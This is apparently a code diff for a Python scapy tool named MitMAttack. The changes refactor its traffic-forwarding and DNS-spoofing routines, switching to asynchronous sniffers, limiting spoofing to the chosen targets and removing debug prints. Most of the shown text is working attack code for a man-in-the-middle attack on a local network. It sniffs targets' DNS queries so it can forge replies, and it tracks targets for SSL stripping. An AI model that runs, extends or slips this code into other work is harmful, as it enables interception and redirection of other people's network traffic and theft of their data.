@@ -9,7 +9,7 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import ARP, getmacbyip, Ether
 from scapy.main import load_layer
-from scapy.sendrecv import sendp, send, sniff
+from scapy.sendrecv import sendp, send, sniff, AsyncSniffer
 
 import argparse
 import logging
@@ -42,16 +42,16 @@ class MitMAttack:
         self.network_interface = args.network_interface if args.network_interface else self.ask_network_interface()
 
         self.targets = [{'ip': ip} for ip in args.targets]
-        self.targets_ip = [ip for ip in args.targets]
+        self.targets_ip = set([ip for ip in args.targets])
         for target in self.targets:
             target['mac'] = getmacbyip(target['ip'])
 
-        self.dns_spoofing_targets = [self.targets[i] for i in args.dns_spoof] if args.dns_spoof else []
-        self.ssl_strip_targets = [self.targets[i] for i in args.ssl_strip] if args.ssl_strip else []
+        self.dns_spoofing_targets = set([self.targets[i]['ip'] for i in args.dns_spoof]) if args.dns_spoof else set()
+        self.ssl_strip_targets = set([self.targets[i]['ip'] for i in args.ssl_strip]) if args.ssl_strip else set()
 
         self.host_ip = get_if_addr(self.network_interface)
         self.host_mac = get_if_hwaddr(self.network_interface)
-        print(type(self.host_mac), type(self.host_ip))
+
         print('Working on host: %s, %s, %s' % (self.network_interface, self.host_mac, self.host_ip))
 
         # execute attack
@@ -156,8 +156,9 @@ class MitMAttack:
         Setup request forwarding of the targets
         :return:
         """
-        self.start_thread(target=sniff, lfilter=self.forwarding_filter, prn=self.get_request_forwarding(),
-                          iface=self.network_interface)
+        t = AsyncSniffer(lfilter=self.forwarding_filter, prn=self.get_request_forwarding(),
+                         iface=self.network_interface)
+        t.start()
 
     def get_request_forwarding(self):
         def forward_request(p):
@@ -166,7 +167,7 @@ class MitMAttack:
             :param p: the packet we received
             :return:
             """
-            print(p.summary())
+            # print(p.summary())
             for target in self.targets:
                 if p[IP].dst == target['ip']:
                     p[Ether].dst = target['mac']
@@ -177,17 +178,15 @@ class MitMAttack:
         return forward_request
 
     def dns_filter(self, pkt):
-        return pkt.haslayer(DNS) and (pkt[IP].src in self.targets_ip)
+        return IP in pkt and pkt.haslayer(DNS) and (pkt[IP].src in self.targets_ip)
 
     def dns_sniffer(self):
         """
         This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
         :return:
         """
-        self.start_thread(target=sniff, filter=self.dns_filter, prn=self.get_dns_spoofer(),
-                          iface=self.network_interface)
-        # t = AsyncSniffer(filter=self.dns_filter, prn=self.get_dns_spoofer(), iface=self.network_interface)
-        # # t.start()
+        t = AsyncSniffer(lfilter=self.dns_filter, prn=self.get_dns_spoofer(), iface=self.network_interface)
+        t.start()
 
     def get_dns_spoofer(self):
         def dns_spoofer(p):
@@ -196,13 +195,12 @@ class MitMAttack:
             :param p: the packet we received
             :return:
             """
-            print(type(p))
-            print(p.show())
+            # print(p.summary())
             if not p.haslayer(IP):
                 return
-            print(p[DNS].qd.qname)
+            # print(p[DNS].qd.qname)
 
-            if (p[IP].src in self.targets_ip and
+            if (p[IP].src in self.dns_spoofing_targets and
                     p.haslayer(DNS) and
                     p[DNS].qr == 0 and  # DNS Query
                     p[DNS].opcode == 0 and  # DNS Standard Query
